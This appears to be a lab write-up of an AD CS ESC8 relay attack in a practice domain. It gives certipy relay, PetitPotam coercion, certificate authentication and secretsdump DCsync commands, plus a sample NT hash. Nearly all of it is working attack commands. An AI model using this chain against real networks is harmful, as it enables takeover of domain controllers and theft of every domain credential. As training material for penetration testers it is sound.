

Let’s do the same attack with certipy, setup the listener :
`certipy relay -target 192.168.56.23 -template DomainController`


Trig the coerce just like we did before with petitpotam:  `
python3 PetitPotam.py 192.168.56.1 192.168.56.12

Now we got the certificate so we can get the NT hash of the DC and also the TGT with the command :
`certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12`

This Works:
certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12 -ldap-shell


And we can launch a DCsync with secretsdump and the ticket we get:
```

export KRB5CCNAME=/workspace/esc8/meereen.ccache 

secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local  

# or with the hash  

secretsdump -hashes ':39d964a01c61c19fe36c71627d7ab56c' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local

```


Lets use ntlmrelay and petitpotam then get the pfx file then use certipy for the rest fo the killchain